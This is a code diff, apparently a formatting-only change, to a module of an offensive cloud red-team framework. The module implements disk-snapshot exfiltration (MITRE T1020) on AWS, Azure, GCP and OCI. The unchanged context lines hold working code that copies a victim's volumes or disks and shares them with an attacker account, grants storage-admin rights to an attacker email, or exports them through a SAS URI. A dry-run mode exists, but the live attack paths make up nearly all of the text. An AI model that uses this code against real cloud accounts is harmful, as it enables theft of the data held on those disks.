@@ -52,18 +52,18 @@ logger = logging.getLogger(__name__)
 # ----------------------------------------------------------------
 # Loot schema — Declarative table mapping
 # ----------------------------------------------------------------
-LOOT_ITEMS_KEY = 'results'
+LOOT_ITEMS_KEY = "results"
 LOOT_SCHEMA = [
-    ('resource_id', 'Resource ID', 'bold cyan'),
-    ('snapshot_id', 'Snapshot/Link', 'white'),
-    ('status',      'Status',        'green'),
-    ('exfil_path',  'Exfil Path',    'yellow'),
+    ("resource_id", "Resource ID", "bold cyan"),
+    ("snapshot_id", "Snapshot/Link", "white"),
+    ("status", "Status", "green"),
+    ("exfil_path", "Exfil Path", "yellow"),
 ]
 
 
 @technique(
     technique_id="exfiltration/share_disk_snapshot",
-    tactic='exfiltration',
+    tactic="exfiltration",
     mitre_id="T1020",
     providers=["aws", "azure", "gcp", "oci"],
     severity="critical",
@@ -96,7 +96,16 @@ def _exfil_aws(ctx: ExecutionContext) -> dict[str, Any]:
         return {"error": "AWS requires 'target_id' (Volume ID) and 'share_with' (Account ID)."}
 
     if ctx.safe_mode:
-        return {"results": [{"resource_id": volume_id, "snapshot_id": "DRY-RUN", "status": "would_share", "exfil_path": attacker_account}]}
+        return {
+            "results": [
+                {
+                    "resource_id": volume_id,
+                    "snapshot_id": "DRY-RUN",
+                    "status": "would_share",
+                    "exfil_path": attacker_account,
+                }
+            ]
+        }
 
     try:
         # 1. Create Snapshot
@@ -115,19 +124,21 @@ def _exfil_aws(ctx: ExecutionContext) -> dict[str, Any]:
             SnapshotId=snap_id,
             Attribute="createVolumePermission",
             OperationType="add",
-            UserIds=[attacker_account]
+            UserIds=[attacker_account],
         )
 
         ctx.success(f"Shared snapshot {snap_id} with {attacker_account}")
 
         return {
             "provider": "aws",
-            "results": [{
-                "resource_id": volume_id,
-                "snapshot_id": snap_id,
-                "status": "Shared",
-                "exfil_path": f"Account: {attacker_account}"
-            }]
+            "results": [
+                {
+                    "resource_id": volume_id,
+                    "snapshot_id": snap_id,
+                    "status": "Shared",
+                    "exfil_path": f"Account: {attacker_account}",
+                }
+            ],
         }
     except Exception as e:
         return {"error": str(e), "results": []}
@@ -156,7 +167,16 @@ def _exfil_azure(ctx: ExecutionContext) -> dict[str, Any]:
     snap_name = f"snap-{disk_name[:20]}-{int(time.time())}"
 
     if ctx.safe_mode:
-        return {"results": [{"resource_id": disk_name, "snapshot_id": snap_name, "status": "would_export", "exfil_path": "SAS-URI"}]}
+        return {
+            "results": [
+                {
+                    "resource_id": disk_name,
+                    "snapshot_id": snap_name,
+                    "status": "would_export",
+                    "exfil_path": "SAS-URI",
+                }
+            ]
+        }
 
     try:
         compute = ComputeManagementClient(ctx.session, parts[2])
@@ -164,8 +184,12 @@ def _exfil_azure(ctx: ExecutionContext) -> dict[str, Any]:
         # 1. Create Snapshot
         ctx.info(f"Creating snapshot {snap_name} from disk {disk_name}...")
         poller = compute.snapshots.begin_create_or_update(
-            rg, snap_name,
-            Snapshot(location=ctx.whoami().extra.get("location", "eastus"), creation_data={"create_option": "Copy", "source_resource_id": disk_id})
+            rg,
+            snap_name,
+            Snapshot(
+                location=ctx.whoami().extra.get("location", "eastus"),
+                creation_data={"create_option": "Copy", "source_resource_id": disk_id},
+            ),
         )
         poller.result()
 
@@ -182,12 +206,14 @@ def _exfil_azure(ctx: ExecutionContext) -> dict[str, Any]:
 
         return {
             "provider": "azure",
-            "results": [{
-                "resource_id": disk_name,
-                "snapshot_id": snap_name,
-                "status": "Exported",
-                "exfil_path": sas_uri
-            }]
+            "results": [
+                {
+                    "resource_id": disk_name,
+                    "snapshot_id": snap_name,
+                    "status": "Exported",
+                    "exfil_path": sas_uri,
+                }
+            ],
         }
     except Exception as e:
         return {"error": str(e), "results": []}
@@ -200,8 +226,8 @@ def _exfil_gcp(ctx: ExecutionContext) -> dict[str, Any]:
     except ImportError:
         return {"error": "google-api-python-client not installed.", "results": []}
 
-    disk_id = ctx.params.get("target_id", "").strip() # Name of the disk
-    attacker_email = ctx.params.get("share_with", "").strip() # e.g. user:attacker@gmail.com
+    disk_id = ctx.params.get("target_id", "").strip()  # Name of the disk
+    attacker_email = ctx.params.get("share_with", "").strip()  # e.g. user:attacker@gmail.com
     zone = ctx.params.get("zone", "").strip()
 
     if not disk_id or not attacker_email or not zone:
@@ -212,7 +238,16 @@ def _exfil_gcp(ctx: ExecutionContext) -> dict[str, Any]:
     snap_name = f"exfil-{disk_id[:20]}-{int(time.time())}"
 
     if ctx.safe_mode:
-        return {"results": [{"resource_id": disk_id, "snapshot_id": snap_name, "status": "would_share", "exfil_path": attacker_email}]}
+        return {
+            "results": [
+                {
+                    "resource_id": disk_id,
+                    "snapshot_id": snap_name,
+                    "status": "would_share",
+                    "exfil_path": attacker_email,
+                }
+            ]
+        }
 
     try:
         compute = build("compute", "v1", credentials=ctx.session)
@@ -227,23 +262,33 @@ def _exfil_gcp(ctx: ExecutionContext) -> dict[str, Any]:
         ctx.info(f"Granting access to {attacker_email} on snapshot {snap_name}...")
         policy = compute.snapshots().getIamPolicy(project=project, resource=snap_name).execute()
         policy["bindings"] = policy.get("bindings", [])
-        policy["bindings"].append({
-            "role": "roles/compute.storageAdmin",
-            "members": [f"user:{attacker_email}" if "@" in attacker_email and "serviceAccount" not in attacker_email else attacker_email]
-        })
+        policy["bindings"].append(
+            {
+                "role": "roles/compute.storageAdmin",
+                "members": [
+                    f"user:{attacker_email}"
+                    if "@" in attacker_email and "serviceAccount" not in attacker_email
+                    else attacker_email
+                ],
+            }
+        )
 
-        compute.snapshots().setIamPolicy(project=project, resource=snap_name, body={"policy": policy}).execute()
+        compute.snapshots().setIamPolicy(
+            project=project, resource=snap_name, body={"policy": policy}
+        ).execute()
 
         ctx.success(f"Shared snapshot {snap_name} with {attacker_email}")
 
         return {
             "provider": "gcp",
-            "results": [{
-                "resource_id": disk_id,
-                "snapshot_id": snap_name,
-                "status": "Shared",
-                "exfil_path": attacker_email
-            }]
+            "results": [
+                {
+                    "resource_id": disk_id,
+                    "snapshot_id": snap_name,
+                    "status": "Shared",
+                    "exfil_path": attacker_email,
+                }
+            ],
         }
     except Exception as e:
         return {"error": str(e), "results": []}
@@ -265,7 +310,16 @@ def _exfil_oci(ctx: ExecutionContext) -> dict[str, Any]:
     tenancy_id = config.get("tenancy")
 
     if ctx.safe_mode:
-        return {"results": [{"resource_id": volume_id, "snapshot_id": "DRY-RUN", "status": "would_backup", "exfil_path": tenancy_id}]}
+        return {
+            "results": [
+                {
+                    "resource_id": volume_id,
+                    "snapshot_id": "DRY-RUN",
+                    "status": "would_backup",
+                    "exfil_path": tenancy_id,
+                }
+            ]
+        }
 
     try:
         if signer:
@@ -278,17 +332,13 @@ def _exfil_oci(ctx: ExecutionContext) -> dict[str, Any]:
         if is_boot:
             ctx.info(f"Creating backup of boot volume {volume_id[:20]}...")
             details = oci.core.models.CreateBootVolumeBackupDetails(
-                boot_volume_id=volume_id,
-                display_name=f"QM-Exfil-{int(time.time())}",
-                type="FULL"
+                boot_volume_id=volume_id, display_name=f"QM-Exfil-{int(time.time())}", type="FULL"
             )
             resp = blockstorage.create_boot_volume_backup(details)
         else:
             ctx.info(f"Creating backup of block volume {volume_id[:20]}...")
             details = oci.core.models.CreateVolumeBackupDetails(
-                volume_id=volume_id,
-                display_name=f"QM-Exfil-{int(time.time())}",
-                type="FULL"
+                volume_id=volume_id, display_name=f"QM-Exfil-{int(time.time())}", type="FULL"
             )
             resp = blockstorage.create_volume_backup(details)
 
@@ -301,12 +351,14 @@ def _exfil_oci(ctx: ExecutionContext) -> dict[str, Any]:
 
         return {
             "provider": "oci",
-            "results": [{
-                "resource_id": volume_id,
-                "snapshot_id": backup_id,
-                "status": "Created",
-                "exfil_path": f"Tenancy: {tenancy_id} (Requires IAM Copy Policy)"
-            }]
+            "results": [
+                {
+                    "resource_id": volume_id,
+                    "snapshot_id": backup_id,
+                    "status": "Created",
+                    "exfil_path": f"Tenancy: {tenancy_id} (Requires IAM Copy Policy)",
+                }
+            ],
         }
     except Exception as e:
         return {"error": str(e), "results": []}
